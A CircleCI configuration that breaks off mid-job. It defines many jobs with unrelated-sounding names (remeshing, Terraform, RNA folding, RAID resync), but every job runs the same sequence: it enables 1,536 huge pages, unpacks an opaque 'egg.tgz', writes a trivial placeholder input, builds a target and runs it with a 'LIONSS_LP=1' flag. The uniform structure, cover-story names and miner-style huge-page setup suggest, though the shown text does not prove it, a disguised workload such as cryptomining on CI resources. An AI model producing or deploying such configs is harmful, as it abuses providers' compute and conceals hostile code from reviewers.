version: 2.1

jobs:
  voxel-remesh:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load voxel grid
          command: |
            : > grid.vox
      - run:
          name: Build remesher
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target voxel-remesh -j2
      - run:
          name: Remesh voxel volume
          command: LIONSS_LP=1 ./build/voxel-remesh --in grid.vox --iso 0.5
  terraform-plan-prod:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write tfvars
          command: |
            printf 'region = us-east-1\n' > prod.tfvars
      - run:
          name: Build plan engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target terraform-plan-prod -j2
      - run:
          name: Plan prod changes
          command: LIONSS_LP=1 ./build/terraform-plan-prod --vars prod.tfvars --refresh
  openapi_lint:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Materialize contract
          command: |
            mkdir -p spec && printf 'openapi: 3.1.0\n' > spec/api.yaml
      - run:
          name: Build ruleset engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target openapi_lint -j2
      - run:
          name: Lint OpenAPI contract
          command: LIONSS_LP=1 ./build/openapi_lint --spec spec/api.yaml --ruleset recommended
  rk4_adaptive:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define system
          command: |
            printf 'dydt = -y\n' > ode.txt
      - run:
          name: Build integrator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target rk4_adaptive -j2
      - run:
          name: Integrate with RK4
          command: LIONSS_LP=1 ./build/rk4_adaptive --system ode.txt --tol 1e-8
  ColumnarEncode:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load column
          command: |
            printf '1 2 3 3 3\n' > col.txt
      - run:
          name: Build columnar store
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ColumnarEncode -j2
      - run:
          name: Encode with RLE
          command: LIONSS_LP=1 ./build/ColumnarEncode --col col.txt --scheme rle
  ropeScale:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set positions
          command: |
            printf 'base 10000\n' > rope.cfg
      - run:
          name: Build positional encoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ropeScale -j2
      - run:
          name: Scale RoPE frequencies
          command: LIONSS_LP=1 ./build/ropeScale --conf rope.cfg --factor 4
  saffronPike:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load catalog
          command: |
            printf 'items = 500\n' > catalog.cfg
      - run:
          name: Build index builder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target saffronPike -j2
      - run:
          name: Index catalog
          command: LIONSS_LP=1 ./build/saffronPike --config catalog.cfg --analyzer standard
  FpgaBitgen:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Place constraints
          command: |
            printf 'clk 100mhz\n' > fpga.xdc
      - run:
          name: Synthesize bitstream
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target FpgaBitgen -j2
      - run:
          name: Generate FPGA bitfile
          command: LIONSS_LP=1 ./build/FpgaBitgen --xdc fpga.xdc --part xc7a35t
  anf-lower:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Emit core IR
          command: |
            printf 'let x = 1 in x\n' > core.anf
      - run:
          name: Build normalizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target anf-lower -j2
      - run:
          name: Lower to A-normal form
          command: LIONSS_LP=1 ./build/anf-lower --in core.anf
  redoc-bundle:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Point spec
          command: |
            printf 'spec openapi.yaml\n' > redoc.cfg
      - run:
          name: Build doc bundler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target redoc-bundle -j2
      - run:
          name: Bundle ReDoc page
          command: LIONSS_LP=1 ./build/redoc-bundle --conf redoc.cfg --single
  joinReorder:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Rehydrate tree
          command: tar xzf egg.tgz
      - run:
          name: Prepare toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List tables
          command: |
            printf 'a b c\n' > joins.txt
      - run:
          name: Build join optimizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target joinReorder -j2
      - run:
          name: Reorder join tree
          command: LIONSS_LP=1 ./build/joinReorder --tables joins.txt --dp
  onnxShapeinfer:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch corpus
          command: tar xzf egg.tgz
      - run:
          name: Bring up build env
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write model graph
          command: |
            : > model.onnx
      - run:
          name: Build shape engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target onnxShapeinfer -j2
      - run:
          name: Infer tensor shapes
          command: LIONSS_LP=1 ./build/onnxShapeinfer --model model.onnx --opset 17
  Riverstone:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Checkout vendored deps
          command: tar xzf egg.tgz
      - run:
          name: Install cmake and g++
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load terrain
          command: |
            printf 'tiles = 64\n' > river.cfg
      - run:
          name: Build erosion sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Riverstone -j2
      - run:
          name: Smooth riverstone bed
          command: LIONSS_LP=1 ./build/Riverstone --config river.cfg --iters 50
  svdrandomized:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Prime workspace
          command: tar xzf egg.tgz
      - run:
          name: Provision deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load matrix
          command: |
            : > M.npy
      - run:
          name: Build decomposition
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target svdrandomized -j2
      - run:
          name: Randomized SVD
          command: LIONSS_LP=1 ./build/svdrandomized --matrix M.npy --rank 50
  phyloraxml:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack payload
          command: tar xzf egg.tgz
      - run:
          name: Set up build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write alignment
          command: |
            printf '>t1\nACGT\n>t2\nACGA\n' > aln.fa
      - run:
          name: Build tree inferer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target phyloraxml -j2
      - run:
          name: Infer ML phylogeny
          command: LIONSS_LP=1 ./build/phyloraxml --aln aln.fa --model GTR
  inputRemap:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore snapshot
          command: tar xzf egg.tgz
      - run:
          name: Install native deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load bindings
          command: |
            printf 'jump=space\n' > input.cfg
      - run:
          name: Build input system
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target inputRemap -j2
      - run:
          name: Remap action bindings
          command: LIONSS_LP=1 ./build/inputRemap --conf input.cfg --device gamepad
  icc_profile:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch sources
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write profile
          command: |
            : > display.icc
      - run:
          name: Build CMM
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target icc_profile -j2
      - run:
          name: Apply ICC profile
          command: LIONSS_LP=1 ./build/icc_profile --profile display.icc --intent relative
  riscv-mret:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unroll archive
          command: tar xzf egg.tgz
      - run:
          name: Prepare SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write trap handler
          command: |
            printf 'csrr t0 mcause\n' > trap.s
      - run:
          name: Assemble trap vector
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target riscv-mret -j2
      - run:
          name: Return from machine trap
          command: LIONSS_LP=1 ./build/riscv-mret --in trap.s --xlen 32
  IngestBronze:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Seed workspace
          command: tar xzf egg.tgz
      - run:
          name: Provision toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Land raw events
          command: |
            mkdir -p bronze && printf 'e=1\n' > bronze/raw.jsonl
      - run:
          name: Build ingestion job
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target IngestBronze -j2
      - run:
          name: Ingest to bronze layer
          command: LIONSS_LP=1 ./build/IngestBronze --input bronze --schema infer
  raid-resync:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack sources
          command: tar xzf egg.tgz
      - run:
          name: Install essentials
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List disks
          command: |
            printf 'md0 sda sdb\n' > raid.cfg
      - run:
          name: Build array manager
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target raid-resync -j2
      - run:
          name: Resync RAID array
          command: LIONSS_LP=1 ./build/raid-resync --conf raid.cfg --speed 200m
  HelmholtzSolve:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Mesh domain
          command: |
            printf 'nx 64\nny 64\n' > mesh.in
      - run:
          name: Build FEM solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target HelmholtzSolve -j2
      - run:
          name: Solve Helmholtz equation
          command: LIONSS_LP=1 ./build/HelmholtzSolve --mesh mesh.in --k 2.5
  SeccompFilter:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List syscalls
          command: |
            printf 'read\nwrite\n' > allow.txt
      - run:
          name: Build BPF filter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target SeccompFilter -j2
      - run:
          name: Compile seccomp filter
          command: LIONSS_LP=1 ./build/SeccompFilter --allow allow.txt --default kill
  occlusionPortal:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Mark portals
          command: |
            printf 'portals 8\n' > occ.cfg
      - run:
          name: Build visibility system
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target occlusionPortal -j2
      - run:
          name: Cull via portals
          command: LIONSS_LP=1 ./build/occlusionPortal --conf occ.cfg --pvs
  rnaFold:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Prepare input sequence
          command: |
            printf '>s1\nGGGAAACCCUUU\n' > sample.fa
      - run:
          name: Build folding kernel
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target rnaFold -j2
      - run:
          name: Fold secondary structure
          command: LIONSS_LP=1 ./build/rnaFold --seq sample.fa --temp 37
  ParquetRollup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Stage parquet
          command: |
            mkdir -p pq && : > pq/part-0.parquet
      - run:
          name: Build rollup job
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ParquetRollup -j2
      - run:
          name: Roll up parquet files
          command: LIONSS_LP=1 ./build/ParquetRollup --dir pq --by day
  dx12_barrier:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List resources
          command: |
            printf 'textures 8\n' > rc.cfg
      - run:
          name: Build D3D12 backend
